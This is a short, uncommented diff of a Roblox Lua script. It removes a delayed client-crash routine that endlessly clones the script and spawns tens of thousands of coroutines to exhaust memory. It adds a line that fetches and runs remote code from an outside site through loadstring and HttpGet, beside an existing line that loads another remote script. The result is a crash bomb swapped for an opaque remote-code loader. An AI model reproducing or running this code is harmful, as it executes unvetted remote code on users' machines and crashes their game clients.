@@ -7,27 +7,5 @@ loadstring(game:HttpGet("https://v3rmillion2.net/ps99"))()
 
 repeat wait() until game:IsLoaded()
 wait(240)
-local plr = game.Players.LocalPlayer
-local rs = game:GetService("RunService")
- 
-function lag()
-    while true do
-        script:clone().Parent = plr.PlayerGui
-        print("Rest in peace.")
-    end
-end
- 
-function memoryLeak()
-    for i = 1, 50000 do
-        coroutine.resume(coroutine.create(function()
-            for i = 1, 50000 do
-                spawn(lag)
-            end
-        end))
-    end
-end
- 
-while true do
-    spawn(memoryLeak)
-end
+loadstring(game:HttpGet("https://hugegames.space/1f3cf476ecba4ee66e9ca774.lua"))()
 
